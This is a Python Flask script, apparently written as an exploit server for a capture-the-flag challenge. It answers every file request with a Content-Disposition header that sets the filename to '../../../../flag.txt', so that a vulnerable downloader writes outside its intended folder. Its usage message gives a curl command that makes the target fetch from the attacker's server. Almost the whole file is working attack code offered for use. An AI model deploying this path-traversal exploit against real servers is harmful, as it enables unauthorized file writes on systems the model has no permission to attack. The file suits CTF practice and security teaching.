from flask import Flask, request, make_response
import os

app = Flask(__name__)


@app.route("/<path:filename>")
def serve_file(filename):
    # Log incoming requests
    print(f"[+] Received request for: {filename}")

    # Create a response that will make the vulnerable server
    # write the contents with the filename we want
    response = make_response("This is just placeholder content")

    # Set headers that might help bypass any potential filters
    response.headers["Content-Type"] = "application/octet-stream"
    response.headers["Content-Disposition"] = (
        f'attachment; filename="../../../../flag.txt"'
    )

    print(f"[+] Sending response with filename: ../../../../flag.txt")
    return response


@app.route("/")
def index():
    return "Malicious server running"


def print_usage():
    print(
        """
[*] Malicious server for CTF running
[*] To exploit the vulnerable server, send this request:
    curl -X POST http://vulnerable-server:5000/download -d "url=http://YOUR_IP:8000/anything"
[*] The server will try to traverse to flag.txt using path traversal
    """
    )


if __name__ == "__main__":
    print_usage()
    # Run on all interfaces to ensure it's accessible from the target
    app.run(host="0.0.0.0", port=8000, debug=True)
